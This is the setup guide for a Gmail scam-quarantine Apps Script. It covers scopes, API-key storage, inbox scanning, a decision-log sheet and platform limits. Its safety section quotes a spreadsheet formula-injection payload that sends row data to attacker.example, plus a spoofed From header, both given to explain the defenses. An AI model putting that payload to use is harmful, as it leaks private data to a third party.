# ScamShield Mail — Setup

A Google Apps Script that watches an older adult's Gmail inbox, classifies new
mail with the Anthropic Claude API, and quarantines likely scams by **labeling
and archiving** them. It never deletes anything.

Sections 1-5 are Stage 0: get the project created, the files in place, the
scopes declared, and the API key stored — and prove all of it works with
`checkSetup()`. Section 6 is Stage 1: the inbox reader and the decision log.

---

## 1. Create the Apps Script project

We want a **standalone** script (not one bound to a Doc or Sheet). Standalone
scripts live in your Drive on their own, can own their own triggers, and can be
moved between accounts later — which matters, because the end state of this
project is installing it on a family member's account.

1. Go to <https://script.google.com> and click **New project**.
2. Rename it (top-left, "Untitled project") to **ScamShield Mail**.
3. Open **Project Settings** (the gear in the left rail) and tick
   **"Show `appsscript.json` manifest file in editor"**. Without this the
   manifest is hidden and you cannot edit the OAuth scopes by hand.
4. Still in Project Settings, copy the **Script ID**. You need it for clasp.

---

## 2. Develop locally with clasp (optional but recommended)

`clasp` is Google's CLI for Apps Script. It lets you keep the code in this git
repo and push it up, instead of editing in a browser tab.

```bash
# One-time, machine-wide
npm install -g @google/clasp
clasp login          # opens a browser, grants clasp access to your Apps Script projects
```

You must also flip one switch on your Google account, once:
enable the Apps Script API at
<https://script.google.com/home/usersettings>. If you skip it, every `clasp
push` fails with "User has not enabled the Apps Script API."

Then link this folder to the project you just created:

```bash
cp .clasp.json.example .clasp.json
# edit .clasp.json and paste your Script ID
clasp push
```

`clasp push` **overwrites** the online project with your local files. `clasp
pull` does the reverse. Pick one direction and stick with it — editing in both
places is how you lose work.

Notes:
- `.clasp.json` is gitignored on purpose: it holds a Script ID specific to your
  Google account, so it should not be shared in the repo.
- If `npm install -g @google/clasp` lands you on clasp **v3**, a few subcommand
  names differ from the v2 docs you will find online. Run `clasp --help`. The
  `.clasp.json` + `clasp push` flow above works on both.

**Fallback if clasp is painful:** just paste the file contents into the web
editor. Use the ✚ next to "Files" → *Script* for each `.gs` file, and name them
exactly `Config`, `Main`, `Classifier`, `Logger`, `Digest` (the editor adds the
`.gs`). Paste `appsscript.json` into the manifest file from step 1.3.

---

## 3. The OAuth scopes, one line each

These are declared in `appsscript.json`. Apps Script would otherwise guess
scopes from your code and usually over-grants; declaring them explicitly means
the consent screen shows exactly this list and nothing more.

| Scope | Why we need it |
|---|---|
| `gmail.modify` | Read messages, add/remove labels, archive, mark read — **this scope cannot delete mail**, which is exactly the ceiling hard rule 1 wants. |
| `spreadsheets` | Create and write the decision log / allowlist / errors spreadsheet. |
| `script.external_request` | `UrlFetchApp` — required to call `api.anthropic.com`. |
| `script.scriptapp` | Let the script install and remove its own time-driven triggers (`installTriggers()` in Stage 3). |

Why `gmail.modify` and not `gmail.readonly`: readonly cannot apply labels or
archive, so Stage 4 would be impossible. Why not `https://mail.google.com/`:
that is full access **including delete**, and we never want the credential to
be capable of the thing hard rule 1 forbids. `gmail.modify` is the tightest
scope that still permits quarantine.

### Scopes we will need later (not added yet)

- **`script.send_mail`** — Stage 4's kill-switch alert and Stage 5's weekly
  family digest both send email. This is not in the spec's Stage 0 scope list,
  so I have not added it. Say the word and I will add it at Stage 4; note that
  **changing the scope list forces a re-authorization prompt**, so it is worth
  deciding before you install this on someone else's account.

Every time `appsscript.json` gains a scope, the next run shows the Google
consent screen again. That is normal, not a bug.

---

## 4. Store the Anthropic API key

Hard rule 5: the key lives in **Script Properties** only.

Script Properties is a small key/value store attached to the script project
itself. It is not part of the source, it is not in git, and it is not visible
to anyone who only has view access to the code.

1. Get a key from <https://console.anthropic.com> → API Keys.
2. Apps Script editor → **Project Settings** (gear) → scroll to
   **Script Properties** → **Add script property**.
3. Property: `ANTHROPIC_API_KEY` — Value: your key. **Save script properties.**

`getApiKey_()` in `Config.gs` reads it and throws a message telling you exactly
these steps if it is missing. `maskSecret_()` is what `checkSetup()` prints, so
the key itself never lands in an execution log.

---

## 5. Run the Stage 0 check

In the editor, choose `checkSetup` in the function dropdown and click **Run**.

The first run pops the Google consent screen. Because this script is not
verified by Google, you will see "Google hasn't verified this app" → click
**Advanced** → **Go to ScamShield Mail (unsafe)**. This is expected for a
personal script you wrote yourself; review the scope list on that screen and
confirm it matches the four above.

Open **Execution log** (Ctrl/Cmd + Enter). A healthy run looks like:

```
[1/4] API key found in Script Properties: sk-ant-api03...aB4z (108 chars)
[2/4] Gmail scope OK — 37 unread message(s) in inbox.
[3/4] Trigger scope OK — 0 trigger(s) installed.
[4/4] Anthropic API reachable and key accepted (HTTP 200).
setup OK
```

Step 4 hits `GET /v1/models`, a metadata endpoint that consumes **zero model
tokens** — so it costs nothing and you can re-run it freely. If it returns 401,
the stored key is wrong or revoked. If any step fails, the last line reads
`setup INCOMPLETE` and names the problem.

---

## 6. Stage 1 — the inbox reader and the log

Stage 1 adds the whole pipeline **except the AI**: it reads recent inbox mail,
extracts a minimal payload from each message, and writes one row per message to
a Google Sheet with the placeholder verdict `NOT_CLASSIFIED`. Nothing is
labeled, archived, marked read, or deleted.

The point is to prove the plumbing — reading, deduping, allowlisting, logging —
before an API call or any mailbox change exists.

### Create the log spreadsheet

Run **`initLogSheet`** from the Run dropdown. It creates the spreadsheet on
first use and prints its ID and URL to the execution log:

```
Log spreadsheet ready.
  Name: ScamShield Mail — Log (2026-08-28)
  ID:   1AbC...xyz
  URL:  https://docs.google.com/spreadsheets/d/1AbC...xyz/edit
Tabs: Decisions, Config-Allowlist, Errors
```

The ID is saved to the `LOG_SHEET_ID` Script Property, so the script finds the
same sheet on every later run. **No new OAuth scope is needed** —
`SpreadsheetApp.create()` is covered by the `spreadsheets` scope we already
declare, so there is no second consent prompt at this stage.

Two consequences of *not* having a Drive scope, worth knowing now:

- The file is created in the **root of My Drive** and the script cannot move it.
  Drag it into a folder yourself.
- The script cannot **share** it. Stage 5's "a family member can see the log"
  story is a manual share from the Sheets UI.

**Fallback if auto-creation is ever blocked** (a Workspace admin policy, or a
full Drive): create a blank spreadsheet by hand, copy the ID out of its URL
(the long string between `/d/` and `/edit`), set it as the `LOG_SHEET_ID` Script
Property, and run `initLogSheet()` — it will build the three tabs inside your
sheet. Same code path, so the fallback is not untested.

If `LOG_SHEET_ID` points at a sheet that cannot be opened, the script **stops
with a loud error rather than creating a replacement**. That is deliberate: a
silent replacement would orphan your whole decision history *and* reset dedupe,
so the next run would re-process every message in the window.

### Run the scan

Run **`scanInbox`**. A healthy run logs:

```
scanInbox: query = in:inbox is:unread -from:me after:1756400000
scanInbox: threads=3 candidates=3 logged=3 skippedProcessed=0 skippedAllowlist=0 errors=0 elapsedMs=4210
```

Run it a second time and you should see `logged=0 skippedProcessed=3` with **no
new rows**. That test matters more than it looks: because Stage 1 never marks
anything read, every message stays in the search results for the full 20-minute
window and comes back on every run in between. Message-ID dedupe is the only
thing between this design and a log full of triplicates.

### Reading the `Decisions` tab

| Column | What it is |
|---|---|
| `Timestamp` | When the **row was written** (up to 20 min after the mail arrived). |
| `Message ID` | Gmail's ID for the message. This is the dedupe key. |
| `Message Date` | When the **mail actually arrived**. This is the one you usually want. |
| `Sender` | The raw `From` header, display name included — the display name is itself evidence. |
| `Reply-To` | Blank when it matches the sender. **A value here means a mismatch**, which is a classic phishing tell. |
| `Subject` | |
| `Body Preview` | First 200 characters, whitespace collapsed. Hard rule 3 — no more of a body is ever stored. |
| `URL Count` | How many link URLs were extracted. A surprising `0` usually explains a surprising verdict. |
| `Verdict` | `NOT_CLASSIFIED` in Stage 1, or `ALLOWLISTED`. Stage 2 fills in `scam` / `suspicious` / `safe`. |
| `Confidence` | Stage 2. |
| `Reasons` | Stage 2. |
| `Action Taken` | `none (observe-only)` until Stage 4. |
| `Error` | Populated only when something went wrong for that message. |
| `Review` | **Yours to fill in.** Type `WRONG` next to any verdict you disagree with; Stage 6 counts these to compute precision. |

### The allowlist

Put one email address or domain per row in column A of `Config-Allowlist`. Rows
starting with `#` are ignored, so you can leave notes.

```
alice@example.com     # exact address
chase.com             # any address @chase.com
@chase.com            # same thing — a leading @ is optional
```

Matching is **exact**: `chase.com` matches `alerts@chase.com` but **not**
`x@alerts.chase.com`. Add subdomains explicitly, or flip
`ALLOWLIST_MATCH_SUBDOMAINS` in `Config.gs` if you find yourself adding five
entries per bank.

An allowlisted sender is **never scanned** (hard rule 6). Be conservative: `From`
addresses can be forged, so an entry here is a permanent blind spot. Prefer
exact addresses over whole domains.

### Why the query is not `newer_than:20m`

Because that would mean **twenty months**. Gmail's `newer_than:` and
`older_than:` operators accept only `d` (days), `m` (**months**) and `y`
(years) — there is no minute or hour unit. With a 10-message-per-run cap, a
`newer_than:20m` query would have quietly logged ten arbitrary messages out of
two years of inbox on every single run.

Minute resolution needs Gmail's `after:` operator with a **Unix epoch-seconds**
integer, which is what `buildSearchQuery_()` builds. That also avoids a second
trap: slash-format dates (`after:2026/08/28`) are interpreted at midnight
**Pacific** time regardless of the `timeZone` in `appsscript.json`. Epoch
seconds have no timezone at all.

The config value is therefore `POLL_WINDOW_MINUTES: 20` — a plain number, so
the correct query is the only easy one to write.

### Two safety details you may not expect

**Formula injection.** Every string written to the sheet — subject line, sender
display name, body preview — comes out of a hostile email, and Google Sheets
treats a value starting with `=`, `+`, `-` or `@` as a **formula**. A subject
line of `=HYPERLINK("http://attacker.example/"&ENCODEURL(A2:N2),"Open me")`
would otherwise become a live, clickable formula inside the very sheet meant to
be a safe place to review dangerous mail. `sanitizeForSheet_()` prefixes every
text value with an apostrophe, which is Sheets' "this is text" marker — it is
not displayed and it is not part of the value when you read the cell back.

**Display-name spoofing.** `extractEmailAddress_()` matches the **last**
`<...>` pair in a header, not the first. The trick it defends against looks like
this:

```
From: "support@paypal.com <security@paypal.com>" <evil@ru-host.tld>
```

A regex that grabs the first bracket pair returns `support@paypal.com` — and if
that were on your allowlist, the attacker would walk straight through.

---

## Apps Script limits that shape this design

Worth knowing now, because they explain choices in later stages:

- **6 minutes per execution.** A run that exceeds it is killed mid-way. Stage 1
  therefore caps work at `MAX_MESSAGES_PER_RUN` and bails at a ~4.5 minute
  budget, so we always exit cleanly rather than being cut off.
- **Total trigger runtime is capped per day** (roughly 90 minutes/day on a free
  `@gmail.com` account, ~6 hours on Workspace). At a 10-minute trigger that is
  144 runs/day sharing that budget — about 37 seconds each on a consumer
  account. This is the binding constraint, not the API cost, and it is why we
  process at most ~10 messages per run rather than sweeping the whole inbox.
- **`UrlFetchApp` daily quota** is 20,000 calls/day (consumer). One call per
  message means we would need 20,000 messages a day to hit it. Not a concern.
- **Time-driven triggers** offer fixed choices (every 1/5/10/15/30 minutes,
  hourly, daily…), so "every 10 minutes" is a real option; arbitrary intervals
  are not. Google also fires them within a window around the scheduled time,
  not to the second — which is why the Gmail search uses a 20-minute lookback
  for a 10-minute trigger, giving us overlap so nothing slips through a late
  run.
- **Script Properties**: 9 KB per value, 500 KB total. Fine for a key and a few
  flags; it is not where the decision log goes.

---

## File map

| File | Role | Status |
|---|---|---|
| `appsscript.json` | Manifest: runtime, timezone, OAuth scopes | Stage 0 ✅ |
| `Config.gs` | `CONFIG` object, secrets access (`getApiKey_`) | Stage 1 ✅ |
| `Main.gs` | Entry points: `checkSetup()`, `scanInbox()`, payload extraction | Stage 1 ✅ |
| `Logger.gs` | Google Sheet audit trail, allowlist, dedupe, `initLogSheet()` | Stage 1 ✅ |
| `Classifier.gs` | Anthropic API call + verdict parsing | Stage 2 |
| `Digest.gs` | Weekly family summary email | Stage 5 |

`timeZone` in the manifest is set to `America/New_York`. Change it if that is
not yours — it controls when the daily/weekly triggers actually fire.
